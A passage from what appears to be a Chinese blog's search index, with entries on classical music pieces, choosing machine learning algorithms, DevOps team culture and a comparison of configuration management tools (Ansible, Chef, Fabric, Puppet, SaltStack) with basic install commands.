可以说，这是一首相当享乐的音乐。有关《求爱》的歌词也是类似的内容，马力全开。放荡不羁的精神,对放浪形骸的生活方式的赞美以及对封建社会的无情嘲讽都令人惊讶。毫无疑问，这些被称作”中世纪的拉丁抒情诗”的作品出现在以基督教文化为中心的时代，不能不说是一个奇迹。 如果考虑到此曲创作于 1937 年的纳粹德国，这样欲望全开的歌词或许就是真实的表现。（注： 1937年7月19日，“堕落艺术展”在慕尼黑举行。这个展览是纳粹对现代艺术发起的最猛烈的攻击。展览将超过650件著名的绘画、雕塑和版画集中展出，向观众将其污蔑为“堕落”的，是应当被净化的“渣滓”。） 德国人有着一种好沉思深省的内向之感，喜幻想，多情善感；毫无疑问，正是这种性格使他们特别喜爱一种排除一切外在的兴趣而本身具备自我发展的基本要素的音乐。—— 《西方音乐史》【法】保·朗多尔米 古典音乐经典名曲奥尔夫（Orff）《Carmina Burana|布兰诗歌》拥有强力而单纯的节奏和明快的旋律，乐曲、歌词潇洒。 肖邦（Chopin）《Trois Valses Op.64 No.1 | 小狗圆舞曲》 1846-1847 法语：Trois Valses，在英语中也被称为 “Minute Waltz” 肖邦是钢琴诗人，在世人眼前浮现出来的是纤细而病弱的王子形象，较受女性欢迎。 通常的说法，肖邦是看到他的情人作家乔治·桑（George Sand）所养的一只小狗追着自己尾巴团团转的场景创作《小狗圆舞曲》，肖邦将作品献给了德费努·波特卡（Delfina Potocka）伯爵夫人。 肖邦（Chopin）《Fantasie Impromptu in C Sharp Minor Op.66 | 幻想即兴曲》《幻想即兴曲》原本是不会面世的一首作品，曲名是后人命名，肖邦留下遗言：“在我死后请烧掉曲谱。”开头的旋律美妙动人，飘荡着肖邦曲目特有的浪漫情怀。虽然甜美而热情，但也微微感到心痛。这所曲子背后肯定有一个心酸的故事，难怪肖邦本人不喜欢呵。 舒曼（Schumann）《Violin Concerto In D Minor | D小调小提琴协奏曲》舒曼是一位苦恼的艺术家形象。晚年精神失常，跳过莱茵河（又被人捞上来）、在精神病疗养院度过晚年。作品中充满了舒曼独特而浓厚的浪漫情结，第二乐章的旋律高贵而优雅。舒曼创作此曲用了2周时间，直到首次公演却过了 80 年。如果不是 1937 年，在柏林图书馆中约阿希姆的藏书中发现了乐谱，恐怕将永远被埋没。 舒伯特（Franz Schubert）《Schubert Symphony No.8 in b minor D.759 | 未完成》《未完成》真的是一部“未完成”的作品，在磁带时期的经典组合：A 面是贝多芬的《命运》，B 面则是《未完成》。 柴可夫斯基（Tchaikovsky）《The Nutcracker | 胡桃夹子》 芭蕾是沉默的。相对于管弦乐团的“谈谈阔论”，登场人物却不发一言。相对的，舞者们犹如否定中立的存在一般轻快地舞蹈。—— 【日】饭尾洋一 《古典音乐说明书》 p101 斯特拉文斯基（Stravinsky）《The Rite of Spring | 春之祭》（芭蕾音乐，1913）本来是一部芭蕾舞剧，但后来脚本遗失，只剩下管弦乐总谱。 拉威尔（Joseph-Maurice Ravel）《Concerto pour la main gauche | D大调左手钢琴协奏曲》约瑟夫-莫里斯·拉威尔（法语：Joseph-Maurice Ravel，1875年3月7日－1937年12月28日），法国作曲家和钢琴家。生于法国南部靠近西班牙的山区小城西布勒，1937年在巴黎逝世时，已经是法国乐坛中与克劳德·德彪西齐名的印象乐派作曲家。 与“两手”的协奏曲相比，“左手”的音乐构想更加严谨而独到。既有苦恼，又有诗歌般的情绪及幽默。值得一提的是，拉威尔本人在谱曲完成后立刻进行了试演出，但未能仅使用左手弹奏，而是用了双手。 拉威尔（Joseph-Maurice Ravel）《Boléro | 波莱罗舞曲》 法语名称：Boléro，1928 年拉威尔创作《波莱罗舞曲》的时候已经 53 岁。波莱罗舞曲原本指西班牙舞曲中的一种。使用小军鼓作为开篇，这个节奏重复了 169 次，持续 15 分钟有余。 情节：在西班牙的一个小酒店里，一个少女在翩翩起舞。开始时她只是缓缓跳动，舞姿优美而轻盈。随着音乐的逐渐热烈，舞蹈也越来越欢快奔放，迷住了在场的人们。他们开始随着音乐打着节拍助兴，并情不自禁地与少女一起欢舞，最后在狂欢的气氛中结束。 伦纳德·伯恩斯坦（Leonard Bernstei）《Candide Overture| 老实人·序曲》原本是作为音乐剧的开幕音乐创作。开场号角齐鸣，充满了沸腾般的跃动感，整曲精力充沛、一气呵成。 约翰·施特劳斯二世(Johann Baptist Strauss) 《An der schönen blauen Donau op.314 | 蓝色多瑙河》 德语：An der schönen blauen Donau Op.314实际上多瑙河既不清、也不美，不怎么蓝，浑浊中混杂着绿色，一如普奥战争惨败后帝国首都维也纳市民哀叹的心境。据说有了此曲之后，多瑙河两岸的人们才蓦然发现，原来多瑙河是“蓝色的”。Amazing ! 贝多芬（Ludwig van Beethoven）《The Symphony No.9 in D minor, Op.125 | 第九交响曲》《第九交响曲》不仅仅需要管弦乐团进行演奏，还需要合唱和独唱，是超过 1 个小时的巨作。该曲在世界文化界有相当重要的地位，尤其该曲第四乐章部分乐段经指挥家赫伯特·冯·卡拉扬整理后，以《欢乐颂》（Ode to Joy）之名成为欧洲联盟的官方盟歌。 埃尔加（Edward William Elgar）《Pomp and Circumstance Marches Op.39 | 威风堂堂进行曲》这首曲子经常在足球赛场上听到。英格兰许多球队的球迷都会高歌“希望与荣光之地”来鼓舞选手。 瓦格纳（Wilhelm Richard Wagner）《Wedding March | 婚礼进行曲》有名的婚礼进行曲有两种。一首是瓦格纳的婚礼进行曲，庄严肃穆；另一首是门德尔松的婚礼进行曲，华丽而隆重、充满祝福。 瓦格纳的作品是在歌剧《罗恩格林》中女主人公埃尔莎和天鹅骑士的婚礼上演奏的，代表了分离与死亡。门德尔松的看起来更吉利一些，但是，瓦格纳的故事隐喻“婚后才第一次知道对方是怎样的人”，似乎更有深意。 帕赫贝尔（Johann Pachelbel）《Canon in D Major | 卡农》作者死后200年的1919年才首次出版，过了三个世纪以上才得以成名的最强古典乐。 萨蒂（Erik Satie）《Gymnopédie |裸体歌舞》第一首治愈系经典作品。慵懒的旋律缓缓流淌，非常适合大脑一片空白，边发呆边听的音乐。 巴赫《Goldberg-Variationen，BWV 988 | 哥德堡变奏曲》据说是凯瑟琳伯爵拜托巴赫写一首适合在失眠夜听的曲子。巴赫应其要求，创作了这首超长的变奏曲大作。开篇的咏叹调平稳安详，但之后的部分却洋溢着刺激旋律，听这样的曲子真的会困吗？ 普罗科菲耶夫（Sergei Sergeyevich Prokofiev）《Cinderella,Op.87 | 灰姑娘》华尔兹普罗科菲耶夫是“遵从旧古典乐芭蕾的传统”谱写了《灰姑娘》，这首曲子用于灰姑娘出发去舞会之前的场景，在舞会舞蹈前，华尔兹已抢先开始演奏。 1941 年普罗科菲耶夫抛妻弃子，选择了 25 岁的女作家米拉·门德尔松（Mira Mendelson）。1948 年他被指责犯上了“形式主义的错误”，并被要求要注意作品的“民族性”。这件事影响了普罗科菲耶夫的健康，他的第一任夫人丽娜也因间谍嫌疑被捕（丽娜生于西班牙，在美国长大），并被判处在劳动营服役 20 年的重刑。 1953年3月5日普罗科菲耶夫去世，讽刺的是，正是当日，苦难大施主斯大林也逝世。普罗科菲耶夫曾被授予“斯大林奖”，死后被追授“列宁奖”。 德彪西（Achille-Claude Debussy）《Children’s Corner | 儿童乐园》钢琴曲集《儿童乐园》是为了德彪西刚刚 3 岁的 Chou-Chou 而作的。作品充满了温柔和幽默，还添上了给女儿的献词，连封面的设计都充满了爱意。 巴达捷夫斯卡（Tekla Bądarzewska-Baranowska）《Modlitwa dziewicy | 少女的祈祷》钢琴独奏仅有的一首由真正的少女创作的“少女名曲”。巴达捷夫斯卡创作的时候年仅 17 岁，1861 年，年仅 27 岁的巴达捷夫斯卡留下丈夫和 5 个孩子去世了。 奥涅格（Arthur Honegger，港译：康涅格）《Pacific 231 | 太平洋 231 》瑞士作曲家奥涅格（Arthur Honegger）是一位热衷于铁道的作曲家。他有一句名言，“就像其他人喜爱女性和马那样，我爱着电车”。奥涅格在交响乐《太平洋 231》中用管弦乐队还原了蒸汽列车，通过节奏变化演绎出加速感，“231” 表示的是车轴配置，前轮、动轮、辅助轮的数量分别是2个、3个、1个。 哈恰图良（Aram Il’yich Khachaturian）《Sabre Dance | 马刀舞曲》节奏快速，激烈热情。《马刀舞曲》是一篇急就章，乐曲中的焦躁感或许就是作曲者当时的心情。《马刀舞曲》的巨大成功反而衬托得作曲者其他作品都不起眼了，哈恰图良懊恼道“若知道会让其他作品失去关注的话，我就不会写了”。 乔治·比才（Georges Bizet）《Carmen | 卡门》歌剧中无人不知，无人不晓的存在。 古斯塔夫·马勒（德：Gustav Mahler）《Symphony No.1 Titan | 第一交响曲·巨人》“交响曲要像世界一样，必须要能包容万象。” 扩展阅读 古典音乐低俗史 舞台剧：南海十三郎 电影评论|灵魂解码《林肯》 电影评论|斯皮尔伯格的林肯情怀 风月集|诗三百，思无邪 世纪小说《悲惨世界》 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 江南园林鉴赏|南京瞻园 摄影专辑|珠海航空航天展览 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 参考文献 古典音乐欣赏从这里轻松入门 | 原创 2016-10-30 古典音乐 《 THE FENCER 》，一部真实题材的击剑作品、一部 FIE 推荐的击剑电影！ 绝望的微笑–柴可夫斯基《悲怆》交响曲 天生的激进分子：德彪西 【音乐研究】音乐品位折射你的思维 【2016-5-23】本科论文 | 纳粹德国1937年“堕落艺术展”研究 （by 骆舒星 ） @古典音乐：西方音乐发展脉络全景图 @欧美内参：德国学校是怎么教音乐的？]]></content>
      <tags>
        <tag>Art</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Commander-Navy-Digital]]></title>
    <url>%2F2018%2F04%2F09%2FCommander-Navy-Digital%2F</url>
    <content type="text"><![CDATA[摘要 参考文献 美军核潜艇部队现状及其发展 | 2018-03-12 知远战略与防务研究所 海军百科|潜艇潜望镜 海军百科|攻击潜望镜 美国海军居然用Xbox手柄来控制潜艇潜望镜|腾讯数码2017-09-21 The U.S. Navy is using Xbox 360 controllers to operate submarine periscopes | 9.19.17 Newest Navy attack sub uses an Xbox controller to operate its periscope | 3.17.18 Dishonorable discharge for e-cigs — U.S. Navy bans the devices aboard vessels|4.16.17 Navy uses virtual reality to train crews for deployment on the ships of tomorrow|9.2.17 维基百科：弗吉尼亚级攻击型核潜艇 维基百科：美国海军潜艇级别列表 宁波破获特大卷烟案，案值上亿| 加热不燃烧新型卷烟非法经营案 | 2018-1-24 来源：宁波晚报 作者：张贻富]]></content>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:如何选择机器学习算法？]]></title>
    <url>%2F2018%2F04%2F02%2FMachine-Learning-Algorithms-Sheet%2F</url>
    <content type="text"><![CDATA[摘要 识别和应用机器学习算法解决问题 机器学习算法备忘单 何时使用特定算法? 线性回归 vs 逻辑回归,Linear SVM vs kernel SVM,Trees 神经网络和深度学习：k-means/k-modes,GMM,Hierarchical clustering,PCA,SVD,LDA Machine Learning Algorithms Overview关于目前最流行的一些机器学习算法，建议阅读： Machine Learning:机器学习算法 Machine Learning:机器学习书单 如果您已经非常熟悉这些算法，可以跳过本节。 Which machine learning algorithm should I use? Which machine learning algorithm should I use? | Hui Li | Principal Staff Scientist, Data Science 面对各种机器学习算法时，经常遇到的一个典型问题是“我应该使用哪种算法？” 问题的答案取决于许多因素，其中包括： 数据的大小，质量和性质 可用的计算时间 任务的紧迫性 你想对数据做什么 即使是一位经验丰富的数据科学家，也无法在尝试不同的算法之前知道哪种算法会表现最好。我们并不主张这是唯一的、完美的方案，而是希望能够根据一些明确的因素提供指导——首先应该尝试哪些算法。 机器学习算法备忘单机器学习算法备忘单（The machine learning algorithm cheat sheet）可以帮助您从各种机器学习算法中进行选择，以找到适合您的特定问题的适当算法。本文将说明使用备忘单的过程。 由于备忘单是为初学者数据科学家和分析师设计的，因此在讨论算法时会做一些简化假设。这里推荐的算法来自几位数据科学家和机器学习专家和开发人员的反馈和提示。有几个问题我们的看法并不一致，对于这些问题，我们试图强调通用性、尽量调和差异。随着我们的知识库发展，将包含一套更完整的方法，其他算法将在稍后添加。 如何使用备忘单备忘单使用方法，依次阅读的路径和算法标签，例如： 如果要执行降维（dimension reduction），则使用主成分分析（principal component analysis） 如果您需要快速进行数值预测（numeric prediction），请使用决策树（decision tree）或逻辑回归（ logistic regression） 如果您需要分层结果，则使用分层聚类（hierarchical clustering） 有些场景可能会适用不止一个分支，也有些场景不能完美匹配上，重要的是要记住，这些路径只是基于经验的方法，因此一些建议并不完全准确。许多数据科学家的关电视，找到最好算法的唯一方法就是尝试所有算法（the only sure way to find the very best algorithm is to try all of them）。 何时使用特定算法?线性回归 vs 逻辑回归线性回归是一种讨论连续因变量之间关系的建模方法。如果因变量不是连续的而是分类的，则可以使用 logit link function 将线性回归转化为逻辑回归。逻辑回归是一种简单，快速而强大的分类算法。这里我们讨论二进制情况下的因变量 在逻辑回归中，我们使用不同的假设类来尝试预测给定示例属于“1”类的概率与其属于“-1”类的概率。 线性回归 逻辑回归 Linear SVM vs kernel SVM当数据的各种类型不是线性可分的时候，核方法（Kernel method 或 Kernel tricks）可以用来将非线性可分的空间映射到更高维的线性可分的空间。 支持向量机（SVM）算法相当于通过法线（Normal vector）和超平面偏差（bias of the hyperplane）获得分类器。这个超平面（边界）尽可能宽地分隔不同的类，该问题可以转化为约束优化问题。 当大多数因变量是数字时，逻辑回归和 SVM 是首先应该尝试的分类方法。这些模型易于实现，参数易调整，性能也相当不错。非常适合初学者。 线性回归 逻辑回归 树 | Tree 预测模型中的决策树 决策树（Decision Tree），随机森林（Random Forest）和梯度提升（Gradient Boosting ）都是基于决策树的算法。决策树有许多变体，但它们都做同样的事情 - 将特征空间细分成大多数标签相同的区域。决策树很容易理解和实施。但是，当我们耗尽树枝（branch）并且深入时，它们倾向于过度拟合数据。随机森林和梯度提升是两种使用树算法的实现，具有良好的精确度，是克服过拟合问题（over-fitting problem）的流行方法。 注：在统计学中，过拟合（overfitting，或称过度拟合）现象是指在拟合一个统计模型时，使用过多参数。对比于可获取的数据总量来说，一个荒谬的模型只要足够复杂，是可以完美地适应数据。过拟合一般可以视为违反奥卡姆剃刀原则。当可选择的参数的自由度超过数据所包含信息内容时，这会导致最后（拟合后）模型使用任意的参数，这会减少或破坏模型一般化的能力（目标效果应适用于一般化的情况而非只是训练时所使用的现有数据（根据它的归纳偏向））。另一种常见的现象是使用太少参数，以致于不适应数据，这则称为乏适（underfitting，或称：拟合不足）现象。 神经网络和深度学习 神经网络在 20 世纪 80 年代中期由于其并行和分布式处理能力而兴旺发达。但是在这个领域的研究受反向传播算法无效性的阻碍，它广泛用于优化神经网络参数。支持向量机（SVM）和其他更简单的模型，可以通过求解凸优化问题来轻松训练，逐渐取代机器学习中的神经网络。 近年来，诸如无监督预训练（ unsupervised pre-training）和分层贪婪训练（layer-wise greedy training）等新的和改进的训练技术促进了神经网络的复兴。日益强大的计算能力，例如图形处理单元（GPU）和大规模并行处理（MPP），也刺激了神经网络的发展，已经发明出具有数千层的神经网络模型。 注：反向传播（Backpropagation，缩写 BP）是“误差反向传播”的简称，一种与最优化方法（如梯度下降法）结合使用的，用来训练人工神经网络的常见方法。该方法对网络中所有权重计算损失函数的梯度。这个梯度会反馈给最优化方法，用来更新权值以最小化损失函数。 SAS Visual Analytics 中的神经网络换句话说，浅层神经网络已演变成深度学习神经网络。深度神经网络对于监督学习非常成功。当用于语音和图像识别时，深度学习的表现与人类一样好，甚至更好。应用于无监督学习任务（如特征提取），深度学习还可从原始图像或语音中提取特征，而人工干预则更少。 神经网络由三部分组成：输入层（input layer），隐藏层（hidden layers）和输出层（output layer）。训练样本定义了输入层和输出层。当输出层是一个分类变量时，神经网络就是解决分类问题的一种方法。当输出层是连续变量时，网络可以用来做回归。当输出层与输入层相同时，网络可用于提取内在特征。隐藏层的数量决定了模型的复杂性和建模容量。 k-means / k-modes，GMM（高斯混合模型）聚类k-means / k-modes，GMM 聚类旨在将 n 个观测分为 k 个聚类。 简单地说，k-means 的结果是每个数据点被 assign 到其中某一个 cluster 了，即 hard assignment，而 GMM 则给出这些数据点被 assign 到每个cluster 的概率，又称作 soft assignment 。每个样本都有与每个群集关联的概率。当给定聚类数 k 时，两种算法都足够简单快速地进行聚类。 k-means GMM DBSCAN | 基于密度的空间聚类DBSCAN ，Density-based spatial clustering of applications with noise ，是在 1996 年由 Martin Ester 等提出的聚类分析算法， 这个算法是以密度为本的：给定某空间里的一个点集合，该算法能把附近的点分成一组（有很多相邻点的点），并标记出位于低密度区域的局外点（最接近它的点也十分远），DBSCAN 是一个最常用的聚类分析算法。 Hierarchical clustering | 分层聚类分层分区可以使用树结构（树状图）可视化。它不需要集群的数量作为输入，并且可以使用不同的 K 来在不同粒度级别处查看分区（即精炼/粗化集群 refine/coarsen clusters）。 PCA，SVD和LDA我们通常不希望直接将大量特征提供给机器学习算法，因为某些特征可能无关紧要，或者“内在”维度可能小于特征的数量。主成分分析（PCA，Principal components analysis），奇异值分解（SVD，Singular value decomposition）和隐含狄利克雷分布（LDA，latent Dirichlet allocation）均可用于降维。 PCA 是一种无监督聚类方法，它将原始数据空间映射到较低维空间，同时保留尽可能多的信息。 PCA 基本上找到最能保留数据方差的子空间，子空间由数据协方差矩阵的主要特征向量定义。 SVD 和 PCA 有一定联系——中心数据矩阵的 SVD（特征 vs. 样本）能提供定义由 PCA 所找到的同样子空间的主左奇异向量（dominant left singular vectors）。然而，SVD 是一种更通用的技术，因为它也可以做 PCA 不能做的事情。例如，用户与电影矩阵的 SVD 能够提取可以在推荐系统中使用的用户资料和电影资料。另外，在自然语言处理（NLP）中，SVD 还被广泛用作主题建模工具，称为潜在语义分析（ latent semantic analysis ）。 NLP 中的相关技术是隐含狄利克雷分布（ LDA ）。 LDA 是概率性主题模型，它以与高斯混合模型（GMM）相似的方式，即将连续数据按照高斯密度分解——将文档分解为主题。与 GMM 不同的是，LDA 对离散数据（文档中的词）进行建模，并且它约束了主题需是根据狄利克雷分布的先验分布。 总结：选择算法时的注意事项选择算法时请始终考虑以下方面：准确性（accuracy），训练时间（training time）和易用性（ease of use）。许多用户将准确性放在首位，而 初学者倾向于关注他们最熟悉的算法（Beginners tend to focus on algorithms they know best）。 首先要考虑的是如何获得结果，无论结果如何。初学者倾向于选择易于实现并能够快速获得结果的算法（Beginners tend to choose algorithms that are easy to implement and can obtain results quickly）。这个工作无可厚非，只需确保它只是整个过程的第一步。一旦您获得了一些结果并熟悉数据，您可能需要花更多时间、使用更复杂的算法来加强对数据的理解，从而进一步改进结果。 最好的算法也许不是那些已经获得最高准确率的方法，因为算法通常需要仔细调整、广泛训练才可以实现可用性方面的最佳性能。 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 Which machine learning algorithm should I use? | Hui Li | Principal Staff Scientist, Data Science An Information-Theoretic Analysis of Hard and Soft Assignment Methods for Clustering Greedy Layer-Wise Training of Deep Networks Understanding and interpreting your data set 1 KERNEL METHODS IN MACHINE LEARNING1 |By Thomas Hofmann, Bernhard Scholkopf and Alexander J. Smola]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lincoln-Chicago-Orchestra]]></title>
    <url>%2F2018%2F03%2F30%2FLincoln-Chicago-Orchestra%2F</url>
    <content type="text"><![CDATA[摘要参考文献 维基百科：芝加哥交响乐团 维基百科：管弦乐团列表]]></content>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈:DevOps实践的本质是文化]]></title>
    <url>%2F2018%2F03%2F29%2FDevOps-Culture%2F</url>
    <content type="text"><![CDATA[摘要 DevOps实践的本质是文化 DevOps实践的本质是文化2016-07-24 运维日 广州活动纪要地点：羊城晚报 同创汇 刘宇职业路径：新浪－&gt;Puppet实践－&gt;Puppet系列文集－&gt;InfoQ编辑－&gt;西山居社区：LinuxTone.org、InfoQ Automation：工具化 Lean 精益： Measurement：度量一切 Sharing：不管是否成功 人物：Patrick Debois：比利时，独立顾问，DevOps领袖（2008年） 推荐书单 《The Phoenix Project》 《The DevOps Cookbook》 企业：Facebook Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 实践经验1.站立会2.Kanban|看板3.复盘：总结－发现问题－改进4.带领团队翻译书籍 （这事听着都打鸡血) 学习力－团队生命之根 魅族云1.异地多活：专线打通多个IDC机房2.KVM3.网络：OpenStack 实现控制器、GSLB 全局负载均衡，智能路由 微信：自动压力测试实践张兴：8年＋ 1.生产环境运行压力测试2.接入Proxy层，调整请求分配权重3.压测管控 失败监控（系统、逻辑）耗时监控（SUR client）快速拒绝（如何判断是否可以丢弃？）硬件限制（CPU，内存，网卡） 数据：15s监控数据入库画图，1min回退配置（1w台服务器），降低放量速率 YY安全 案例一：海量小包攻击性防御1.20140828 脉冲DDoS攻击40小时，40人团队，监控不足5秒钟一次，发送小包 黑产报价：150元可购买 15G流量，700W pps，攻击成本低 案例二：合作方服务器被入侵概率高（木马） ps/netstat污染处理：内核态，查看System.Call (可以挖掘写一篇) 案例三：主播IP泄漏业务逻辑bug，异常抛出IP 案例四确定当前主要矛盾：投诉盗号、盗刷？服务器入侵？DDoS ?利用现有资源（自有编制、第三方合作），最大投入产出比 决策变量技术预研、业务规模、发展阶段、主要矛盾（切入点） 扩展阅读：DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 中小企业监控体系构建实战 LinkedIn:如何利用大数据算法定位网站性能瓶颈(BOSS) 树莓派(raspberrypi)、saltstack 在线下自助机运维上的应用 | Jasey Wang 邱俊涛：为故障和失败做设计 酷壳：AWS 的 S3 故障回顾和思考 酷壳：从GITLAB误删除数据库想到的 酷壳：这多年来我一直在钻研的技术 GitHub运维机器人 运维的本质：可视化 |2015-05-14 王津银 InfoQ]]></content>
      <tags>
        <tag>最佳工程实践</tag>
        <tag>架构师</tag>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈：基础设施部署和配置管理]]></title>
    <url>%2F2018%2F03%2F26%2FDevOps-Deployment%2F</url>
    <content type="text"><![CDATA[摘要 Ansible vs. Chef vs. Fabric vs. Puppet vs. SaltStack 在生产环境中工作，常常意味着连续部署和遍布全球的基础设施。如果您的基础架构是分散式和基于云的，同时您需要在大量服务器上频繁部署大量类似的服务，如果此时有一种方法可以自动配置和维护以上所有内容将是您的一大福音。 部署管理工具（Deployment management tools）和配置管理工具(configuration management tools)是为此目的而设计的。它们使您能够使用“食谱”（recipes），“剧本” (playbooks)，模板(templates)或任何术语来简化整个环境中的自动化和编排，以提供标准、一致的部署。 在选择工具时请记住几点注意事项。首先是了解工具的模型。有些工具采用主控模式（master-client model），它有一个集中控制点（master）与分布式部署的服务器进行通信，其他部分则可以在更本地的层面上运行。另一个考虑因素是你的环境构成。有些工具是采用不同的语言编写的，对于特定的操作系统或设置可能会有所不同。确保您选择的工具与您的环境完美配合，充分利用团队的特定技能可以为您节省很多麻烦。 1. Ansible￼Ansible是一种开源工具，用于以可重复的方式将应用程序部署到远程节点和配置服务器。它为您提供了基于推送模型（push model ）推送多层应用程序和应用程序组件的通用框架，您也可以根据需要将其设置为 master-client 模式。 Ansible 建立在可用于各种系统上部署应用程序的剧本(playbook)。 何时使用它 ：对您来说最重要的是快速，轻松地启动和运行，并且您不想在远程节点或受管服务器上安装代理（Agent）。如果您的需求重点更多地放在系统管理员身上，专注于精简和快速，请考虑 Ansible 。 价格：免费的开源版本，Ansible Tower 的付费套餐每年 5000 美元（最多可容纳100个节点）。 赞成的理由： 基于 SSH , 不需要在远程节点安装任何代理 学习曲线平缓、使用 YAML Playbook 结构简单，结构清晰 具有变量注册功能，可以使前一个任务作为后一个任务的变量 代码库精简 反对的理由： 相较其他编程语言的工具功能有限。 通过 DSL 实现其逻辑，这意味着需要经常查看文档直到您学会为止 即使是最基本功能也需要变量注册，这可能使简单任务变得复杂 内省（Introspection）很差。例如很难在剧本中看到变量的值 输入，输出和配置文件格式之间缺乏一致性 性能存在一定瓶颈 2. Chef￼Chef 是一个配置管理开源工具，用户群专注面向开发者。Chef 作为 master-client 模式运行，需要一个单独的工作站来控制 master 。Chef 基于 Ruby 开发，纯 Ruby 可以支持大多数元素。Chef 的设计是透明的，并遵循给定的指示，这意味着你必须确保你的指示是清楚的。 何时使用它：在考虑 Chef 之前，需要确保你熟悉 Git ，因为它需要配置 Git ，你必须编写 Ruby 代码。Chef 适合以开发为中心（development-focused ）的团队和环境。对于寻求更成熟异构环境解决方案的企业来说，这是一件好事。 价格：提供免费的开源版本，标准版和高级版计划以每年节点为单位定价。 Chef Automate 的价格为每个节点 137 美元，或者采用 Hosted Chef 每个节点每年节省72 美元。 赞成的理由： 丰富的模块和配置配方(recipes) 代码驱动的方法为您提供更多的配置控制和灵活性 以 Git 为中心赋予 Chef 强大的版本控制功能 ‘Knife’工具（使用 SSH 从工作站部署代理）减轻了安装负担 反对的理由： 如果您还不熟悉 Ruby 和面向过程编程，学习曲线会非常陡峭 这不是一个简单的工具，可能需要维护大量的代码库和复杂的环境 不支持推送功能 3. FabricFabric 是一个基于 Python 的应用程序部署工具。Fabric 的主要用途是在多个远程系统上运行任务，但它也可以通过插件的方式进行扩展，以提供更高级的功能。 Fabric 将配置您的操作系统，进行操作系统/服务器管理，自动化部署您的应用。￼何时使用它：如果您刚刚开始进入部署自动化领域，Fabric 是一个良好的开端。如果您的环境至少包含一点 Python，它都会有所帮助。 价格：免费 赞成的理由： 擅长部署以任何语言编写的应用程序。它不依赖于系统架构，而是依赖于操作系统和软件包管理器 相比其他工具更简单，更易于部署 与 SSH 进行了广泛的整合，以实现基于脚本的流水线 反对的理由： Fabric 是单点设置（通常是运行部署的机器） 使用 PUSH 模型，因此不如其他工具那样适合流水线部署模型 虽然它是用于在大多数语言中部署应用程序的绝佳工具，但它确实需要运行Python，所以您的环境中必须至少有一个适用于 Fabric 的 Python 环境 4. Puppet￼Puppet 长期依赖是全面配置管理领域的标准工具之一。Puppet 是一个开源工具，但是考虑到它已经存在了多长时间，它已经在一些最大和最苛刻的环境中进行了部署和验证。 Puppet 基于 Ruby 开发，但使用更接近 JSON 的领域专用语言（Domain Specific Language，DSL）。Puppet 采用master-client 模式运行，并采用模型驱动(model-driven)的方法。 Puppet 将工作设计为一系列依赖关系列表，根据您的设置，这可以使事情变得更容易或更容易混淆。 何时使用它： 如果稳定性和成熟度对您来说是最关键的因素，Puppet 是一个不错的选择。对于具有异构环境的大型企业和涉及多种技能范围的 DevOps 团队而言而言，这是一件好事。 价格：Puppet 分为免费的开源版本和付费的企业版本，商业版每年每个节点 120 美元（提供批量折扣）。 赞成的理由： 通过 Puppet Labs 建立了完善的支持社区 具有最成熟的接口，几乎可以在所有操作系统上运行 安装和初始设置简单 最完整的 Web UI 强大的报表功能 反对的理由： 对于更高级的任务，您需要使用基于 Ruby 的 CLI（这意味着您必须了解Ruby） 纯 Ruby 版本的支持正在缩减（而不是那些使用 Puppet 定制 DSL 的版本） Puppet 代码库可能会变得庞大，新人需要更多的帮助 与代码驱动方法相比，模型驱动方法意味着用户的控制更少 5. Saltstack ￼SaltStack（或 Salt）是一种基于 CLI 的工具，可以将其设置为 master-client 模型或非集中模型。 Salt 基于Python 开发，提供了 PUSH 和 SSH 两种方法与客户端通讯。 Salt 允许对客户端和配置模板进行分组，以简化对环境的控制。何时使用它： 如果可扩展性和弹性是一个大问题，则 Salt 是一个不错的选择。对系统管理员来说，Salt 提供的可用性非常重要。 价格：提供免费的开源版本，以及基于年度/节点订阅的 SaltStack Enterprise 版本。具体的价格没有在他们的网站上列出，据说每个节点每年的起步价为 150 美元。 赞成的理由： 一旦你渡过了入门阶段，就可以简单地组织和使用 DSL 功能丰富，不需要逻辑和状态 输入，输出和配置非常一致，全部所有 YAML （一个可读性高，用来表达数据序列的格式） 内省(Introspection)非常好。很容易看到 Salt 内部发生了什么 强大的社区 很高的可扩展性和灵活性 反对的理由： 对于新用户来说，非常难以配置，学习曲线陡峭 在入门级别而言，文档很难理解 Web UI 比同领域的其他工具更新、更轻量 对非 Linux 操作系统没有很好的支持 Ansible vs. Chef vs. Fabric vs. Puppet vs. SaltStack您使用的配置管理或部署自动化工具取决于您的环境需求和偏好。 Chef 和 Puppet 是一些较老的、更成熟的选项，它们适用于那些重视成熟性和稳定性而非简单性的大型企业和环境。 Ansible 和 SaltStack 是寻求快速和简约解决方案人士的理想选择，同时在不需要支持某些特殊功能或具有大量操作系统的环境中工作。Fabric 对于小型环境和那些正在寻求更低门槛和入门级解决方案的人来说是一个很好的工具。 SaltStack Arch:Client/Server develop language: Python future: REAL-TIME COMMUNICATION SaltStack ABC12345678## Install$ brew install saltstack## Role:Master$ service salt-master start$ netstat -ant | grep 450 | grep LISTENtcp4 0 0 *.4506 *.* LISTEN tcp4 0 0 *.4505 *.* LISTEN## Role:Master SaltStack Resources SaltStack Formulas Ansible Arch: SSH batch tools develop language: PythonAnsible ABC 1234567# Install$ sudo pip install ansible# 默认路径 /etc/ansible/hosts ,参数 -i 指定 hosts 